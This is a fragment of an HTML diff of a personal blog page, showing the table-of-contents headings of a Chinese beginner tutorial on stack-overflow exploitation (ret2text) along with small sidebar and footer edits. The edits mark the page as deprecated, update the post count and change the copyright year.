class="nav-number">1.4.</span> <span class="nav-text">0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">前置知识要求：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">前置环境要求：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BE%E5%BA%A6%E2%80%9CLinux-%E6%8D%A2%E6%BA%90%E2%80%9D%E4%B8%8E%E2%80%9Cpip-%E6%8D%A2%E6%BA%90%E2%80%9D%E6%9B%B4%E6%8D%A2Linux%E4%B8%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BA%90%E4%B8%BA%E5%9B%BD%E5%86%85%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BA%90%EF%BC%8C%E6%8F%90%E9%AB%98%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E5%90%8C%E7%9A%84Linux%E5%8F%91%E8%A1%8C%E7%89%88%E6%9C%AC%EF%BC%88%E5%A6%82Ubuntu%E3%80%81Kali%E3%80%81manjaro%E7%AD%89%EF%BC%89%E8%AF%B7%E8%87%AA%E8%A1%8C%E5%B0%86%E6%90%9C%E7%B4%A2%E6%A1%86%E5%86%85%E7%9A%84%E2%80%9Clinux%E2%80%9D%E6%8D%A2%E4%B8%BA%E5%AF%B9%E5%BA%94%E7%9A%84%E5%8F%91%E8%A1%8C%E7%89%88%E5%90%8D%E7%A7%B0"><span class="nav-number">1.4.0.4.</span> <span class="nav-text">不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%E6%93%8D%E4%BD%9C%E7%8E%AF%E5%A2%83%E4%BD%8D%E4%BA%8ELinux%EF%BC%9A"><span class="nav-number">1.4.1.</span> <span class="nav-text">以下内容操作环境位于Linux：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%EF%BC%9Achecksec"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">安全检查：checksec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">逻辑分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%E6%93%8D%E4%BD%9C%E7%8E%AF%E5%A2%83%E4%BD%8D%E4%BA%8EWindows%EF%BC%9A"><span class="nav-number">1.4.2.</span> <span class="nav-text">以下内容操作环境位于Windows：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IDA%EF%BC%9A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">IDA：逆向分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F5%E9%94%AE%EF%BC%9A%E4%BD%BF%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%9A%84%E7%A5%9E%E5%99%A8"><span class="nav-number">1.4.3.</span> <span class="nav-text">F5键：使用IDA进行逆向分析的神器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%E6%93%8D%E4%BD%9C%E7%8E%AF%E5%A2%83%E4%BD%8D%E4%BA%8ELinux%EF%BC%9A-1"><span class="nav-number">1.4.4.</span> <span class="nav-text">以下内容操作环境位于Linux：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">栈帧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A5%9E%E5%99%A8%EF%BC%9Apwntools"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">攻击神器：pwntools</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -527,14 +527,14 @@
     <img class="site-author-image" itemprop="image" alt="arttnba3"
       src="/images/avatar.png">
   <p class="site-author-name" itemprop="name">arttnba3</p>
-  <div class="site-description" itemprop="description">- 做了关于你的梦，所以不愿醒来呢 -</div>
+  <div class="site-description" itemprop="description">此页面已废弃，新博客: arttnba3.cn</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -619,7 +619,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
